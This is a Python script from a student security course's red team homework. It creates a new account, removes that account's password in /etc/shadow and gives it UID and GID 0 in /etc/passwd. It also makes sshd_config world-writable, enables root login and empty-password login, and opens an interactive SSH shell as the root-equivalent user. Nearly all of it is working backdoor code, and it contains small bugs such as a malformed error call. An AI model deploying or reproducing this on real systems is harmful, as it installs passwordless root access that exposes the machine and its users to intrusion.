# CSEC473: HW4 Red Team Script
# Author: Kenyon Litt     Fall 2022
# ___________________________________________________________---
# This script will attempt to gain shell accss to root account via ssh and write permission vulns
# THIS SCRIPT WILL ONLY WORK ON A LINUX SYSTEM 
from doctest import master
from genericpath import isfile
import subprocess
import datetime
import os
import time
import fileinput
import socket





def print_msg(msg, msgtype):
    # This is the function to print each line for the script, whcih correctly formats the date
    # and information about the line like where its being run, and the inforation its self
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    final_msg = f'[{time}]--[{msgtype}]' # padding func to all lines align up
    msgbuffer = len(final_msg)
    lenbuff = 40
    finalbuff = lenbuff-msgbuffer
    for counter in range(0,finalbuff):
        final_msg += ' '
    final_msg += f': {msg}'
    print(final_msg)


def init():
    # This is thie function to print out the inital information for the script, including terms
    print("=======================================================================================")
    print('     RSSHEX v1.3')
    print('     === SSH PRIV. Escilation to root with SUDO Account and Write Permissions to SSH Config ===')
    print_msg("WELCOME! This program is for educational use only on authorized equipment!, by continuing you agree to these terms", "INIT")
    print_msg("Created by Kenyon Litt, for CSEC 473", "INIT")
    print_msg('Note: You will need an account with privs to edit the ssh config file, as well as sudo for this to work', 'INIT')
    print("=======================================================================================")


def verify_exploit():
    # This funciton verifies that the permissions of sshd_config are vulnerable, and that the 
    # config is correctly set for it to work
    master_flag = False
    os.popen("sudo systemctl status ssh")
    print_msg('Starting Verification','CHECK_EXPLOIT')


    print_msg('Checking SSH config Permissions', 'CHECK_EXPLOIT')
    if os.path.exists('/etc/ssh/sshd_config'):
        if os.path.isfile('/etc/ssh/sshd_config'):
            # check if you can write to config, if so the flag is the boolean returned
            master_flag = (os.access('/etc/ssh/sshd_config', os.W_OK)) 
            print_msg(f'SSHD Config has write permissions!', 'CHECK_EXPLOIT')

    # open the ssh config, read all lines
    with open('/etc/ssh/sshd_config') as sshd_config_file:
        sshd_config_data = sshd_config_file.readlines()
    
    
    for counter in range(0,len(sshd_config_data)):
        # check if root login is enabled, and not its default
        if 'PermitRootLogin yes' in sshd_config_data[counter] and '#PermitRootLogin' not in sshd_config_data[counter]:
            master_flag = True
            print_msg(f'SSHD CONFIG already allows root login', 'CHECK_EXPLOIT')
        # check if permit empty passwords enabled, and not default
        if 'PermitEmptyPasswords yes' in sshd_config_data[counter] and '#PermitEmptyPasswords' not in sshd_config_data[counter]:
            master_flag = True
            print_msg(f'SSHD CONFIG already allows no password login', 'CHECK_EXPLOIT')

    if master_flag:
        print_msg(f'Check Complete, VULNERABLE!!', 'CHECK_EXPLOIT')
    # return flag result which will be set to true if any setting is set
    return master_flag



def main():
    # this is hte main runner function for the script, it accomplishes the whole process
    # mainly using os.system calls (linux commands) for compatability
    # check to make sure the explot works from verify_exploit
    if verify_exploit():
        print_msg("Starting Main Process.......", "MAIN")
        username = "Script Running under user account  " + os.getlogin()
        print_msg(username, "== INFO ==")
        #print_msg("Provide Account Password for Sudo Access", "MAIN")
        print_msg("Checking status of ssh...", "MAIN")
        #start ssh process
        ssh_status = (os.popen("sudo systemctl status ssh").read())
        if "active (running)" not in ssh_status:
            print_msg("SSH Needs to be started!", "MAIN")
            os.popen("sudo systemctl enable --now ssh").read()
            os.popen("sudo systemctl start ssh").read()
        else:
            print_msg("SSH Started!", "MAIN")
        print_msg("Provide name for new user", "INPUT")
        
        #Ask for the username to use for the escilation
        new_username = str(input("\t\t\t\t\t> "))
        print_msg(f'Ceating new user account {new_username}', "== INFO ==")
        user_status = (os.popen(f'sudo useradd {new_username}').read())
        if "exsists" in user_status:
            print_msg("User already exists, no need to create!", "!! ERR !!")
        
        # Open the shaddow file with cat, and grep for the user account
        # once the user account is grabbed, it can be modified to remove the password entry so it has no password
        # it then will use the sed command to modify the shadow file (and will retry if it cant)
        print_msg(f'Opening Shadow file and attempting to remove password for user {new_username}', "MAIN")
        flag = True
        while(flag): 
            cat_cmd = subprocess.Popen(['sudo', 'cat', '/etc/shadow'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            grepped_cat_cmd = subprocess.check_output(['grep', new_username], stdin=cat_cmd.stdout)
            shadow_line = "".join(grepped_cat_cmd.decode('utf-8').split(" ")).replace("\n", "")

            if "!" in shadow_line:
                new_shadow_line = shadow_line.replace("!", "")
                #print(new_shadow_line)
                sed_cmd = "sudo sed -i 's/" + shadow_line + "/" + new_shadow_line + "/g' /etc/shadow"
                os.popen(sed_cmd)
            else:
                print_msg(f'/etc/shadow file edit for user {new_username} complete!', 'MAIN')
                print_msg(f'New line in shadow file: {shadow_line}', "== INFO ==")
                flag = False
            time.sleep(5)

        # the script will attempt to change the permissions of ssh config if it can, but
        # this still works if its set to another value as long as the account can read/write
        print_msg('Attempting to modify ssh config to 777 Perms if possible...', 'MAIN')
        os.popen(f'sudo chmod +777 /etc/ssh/sshd_config')
        time.sleep(1)

        # this modifies the ssh configuration to permit root login and permit empty passswords
        # by reading the enitre file, storing the position of the parameter in the log file, and then reopening the
        # file and writing that parameter at that position to the yes's needed
        print_msg("Modifying SSHD config to allow root login and empty passwords", "MAIN")
        with open('/etc/ssh/sshd_config') as sshd_config_file:
            sshd_config_data = sshd_config_file.readlines()
        permit_root_login_line = 0
        permit_empty_password_line = 0
        write_flag = False
        for counter in range(0,len(sshd_config_data)):
            if '#PermitRootLogin' in sshd_config_data[counter]:
                permit_root_login_line = counter
                write_flag = True
            if '#PermitEmptyPasswords' in sshd_config_data[counter]:
                permit_empty_password_line = counter
                write_flag = True
        if write_flag:
            #print(sshd_config_data[permit_root_login_line])
            sshd_config_data[permit_root_login_line] = 'PermitRootLogin yes\n'
            #print(sshd_config_data[permit_root_login_line])
            #print(sshd_config_data[permit_empty_password_line])
            sshd_config_data[permit_empty_password_line] = 'PermitEmptyPasswords yes\n'
            #print(sshd_config_data[permit_empty_password_line])
            sshd_config_file = open('/etc/ssh/sshd_config','w')
            sshd_config_file.writelines(sshd_config_data)
            sshd_config_file.close()
        else:
            print_msg('SSHD Options Already Changed, not wriring changes to disk', '== INFO ==')

        # Now ssh needs to be restarted for configuration changes to work
        print_msg('Completed ssh modification', 'MAIN')
        print_msg('Restarting SSH Service...', 'MAIN')
        os.popen('sudo systemctl restart ssh')
        print_msg('SSH Service restarted!','MAIN')
        time.sleep(5)
        
        # Now the passwd file is changed in a similar method to the shadow file. The file is read and then
        # the line is found with the user via grep, and then the string is split based on the : delimeters used by passwd
        # once split, the gid and uid can be changed to zero for root which is written with sed
        counter_esc = 0
        while counter_esc < 3:
            print_msg('Attempting Privledge Escilation on user {new_username}', 'MAIN')
            cat_cmd_passwd = subprocess.Popen(['sudo', 'cat', '/etc/passwd'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            grepped_cat_cmd_passwd = subprocess.check_output(['grep', new_username], stdin=cat_cmd_passwd.stdout)
            passwd_line = "".join(grepped_cat_cmd_passwd.decode('utf-8').split(" ")).replace("\n", "")
            #print(passwd_line)
            split_passwd_line = passwd_line.split(":")
            split_passwd_line[2] = 0 # set to root
            split_passwd_line[3] = 0 # set to root

            new_passwd_line = ''
            for counter in range(0,len(split_passwd_line)):
                if counter != len(split_passwd_line)-1:
                    new_passwd_line+= str(split_passwd_line[counter]) + ':'
                else:
                    new_passwd_line+= split_passwd_line[counter]
            print_msg(f'Old /etc/passwd entry for {new_username} : {passwd_line}', '== INFO ==')
            print_msg(f'New /etc/passwd entry for {new_username} : {new_passwd_line}', '== INFO ==')
            #passwd_line += "\n"
            #new_passwd_line += "\n"
            print_msg(f'Writing changes to /etc/paswd...', 'MAIN')
            sed_cmd = "sudo sed -i 's@" + passwd_line + "@" + new_passwd_line + "@g' /etc/passwd"
            os.popen(sed_cmd)

            # A verification is also preformed for the passwd file to make sure the passwd entry has been changed, and the
            # id isnt the same, before a shell is opened. This is a check against the passwd line set in the preveous section
            print_msg(f'Verifying changes to /etc/paswd...', 'MAIN')
            cat_cmd_passwd = subprocess.Popen(['sudo', 'cat', '/etc/passwd'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            grepped_cat_cmd_passwd = subprocess.check_output(['grep', new_username], stdin=cat_cmd_passwd.stdout)
            verified_passwd_line = "".join(grepped_cat_cmd_passwd.decode('utf-8').split(" ")).replace("\n", "")
            if verified_passwd_line == new_passwd_line:
                print_msg(f'Changes verified, new entry is {verified_passwd_line}', '== INFO ==')
                counter_esc = 3
            else:
                print(verified_passwd_line)
                print(new_passwd_line)
                print_msg(f'MISMATCH WITH PASSWD FILE AND CHNANGED ENTRY, retrying write {counter_esc} more times!', '!! ERR !!')
                counter_esc += 1
            time.sleep(1)
            
            # System information is grabbed (ip) for the ssh connection
            print_msg('Grabbing network information of host for ssh...','MAIN')
            hostname = socket.gethostname()
            ipaddr = socket.gethostbyname(hostname)
            #print(ipaddr)

        # Script tests the id of rht enew user account with a one line ssh command
        print_msg(f'Testing SSH Anonymous Connection and user/group ids {new_username}', 'MAIN')
        #ssh_test = os.popen(f'ssh -t {new_username}@{ipaddr} "whoami"').read()
        ssh_test1 = subprocess.Popen(f"ssh {new_username}@{ipaddr} id", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        print(ssh_test1[0])

        time.sleep(1)
        # The Script tests for who is the user running the command, to verify the user is successfully tunneling to root
        print_msg(f'Testing SSH Anonymous Connection and user/group to verify user is root {new_username}', 'MAIN')
        #ssh_test = os.popen(f'ssh -t {new_username}@{ipaddr} "whoami"').read()
        ssh_test2 = subprocess.Popen(f"ssh {new_username}@{ipaddr} whoami", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        print(ssh_test2[0])

    
        # A shell loop is created with continuous input from the user, and the command is sent via subprocess to run the one line ssh command
        # and ouputed back to the user
        # If the user has a keyboard interrupt then the script will exit, or if theres an error it will try the ssh connection again
        print_msg(f'Creating SSH Shell... (Press KeyboardInterrupt to quit)','MAIN')
        time.sleep(1)
        while True:
            try:
                cmd = str(input(f'[SHELL - {new_username}@{ipaddr}]      >> '))
                if cmd != "" and cmd != " ":
                    shell_response= subprocess.Popen(f"ssh {new_username}@{ipaddr} {cmd}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0].decode('utf-8')
                    print(f'[SHELL - {new_username}@{ipaddr}]:\n{shell_response}')
            except KeyboardInterrupt:
                print_msg(f'Keyboard Interrupt Hit, goodbye!', 'SHELL')
                break
            except subprocess.SubprocessError:
                print_msg(f'ERROR WITH COMMAND/SHEL!', '!! ERR !!')
                continue
    
    else:
        # Condition if vuln check didnt work
        print_msg(f'Error -- Exploit check couldnt be completed, possibly not vulnerable...')
    print_msg(f'Script stopped....','MAIN')

if __name__ == '__main__':
    # Run init and main script
    init()
    main()
    
    